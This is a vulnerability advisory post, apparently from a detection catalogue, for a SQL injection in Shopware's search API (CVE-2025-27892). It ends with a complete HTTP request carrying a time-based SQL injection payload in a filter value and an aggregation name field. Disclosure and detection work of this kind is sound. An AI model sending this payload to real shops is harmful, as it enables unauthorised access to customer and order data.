---
layout: post
cve_id: CVE-2025-27892
title: Shopware < 6.5.8.13 - SQL Injection
pcap: true
pcap_path: /pcaps/2025/CVE-2025-27892.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-27892.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Authenticated attackers can execute arbitrary SQL queries through the aggregations
  parameter in the search API, potentially extracting sensitive data from the Shopware
  database.

  '
remediation: 'Upgrade to Shopware version 6.5.8.13 or later that properly sanitizes
  the aggregations parameter.

  '
reference:
- https://www.redteam-pentesting.de/en/advisories/rt-sa-2025-001/
- https://nvd.nist.gov/vuln/detail/CVE-2025-27892
classification:
  epss-score: 0.02119
  epss-percentile: 0.8367
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L
  cvss-score: 6.8
  cve-id: CVE-2025-27892
  cwe-id: CWE-89
metadata:
  max-request: 1
  vendor: shopware
  product: shopware
  verified: true
tags:
- cve
- cve2025
- shopware
- sqli
- time-based-sqli
- vuln
---

## ðŸ” Vulnerability Description
The Shopware application API contains a search functionality which enables users to search through information stored within their Shopware instance. The searches performed by this function can be aggregated using the parameters in the "aggregations" object. The name field in this "aggregations" in nested object is vulnerable SQL-injection and can be exploited using SQL parameters.


## ðŸŒ HTTP Request
```nohighlight
POST /api/search/order HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Connection: close
Content-Length: 477
Accept: */*
Authorization: Bearer 7lOnNXljtutT1Q56RHok
Content-type: application/json
Accept-Encoding: gzip

{
  "filter": [
    {
      "type": "equals",
      "field": "transactions.stateMachineState.technicalName",
      "value": "paid` FROM `order`; SELECT SLEEP(7); -- "
    }
  ],
  "aggregations": [
    {
      "type": "histogram",
      "name": "order_sum_bucket",
      "field": "orderDateTime",
      "interval": "day",
      "aggregation": {
        "type": "sum",
        "name": "totalAmount ? ? --",
        "field": "amountTotal"
      }
    }
  ]
}
```

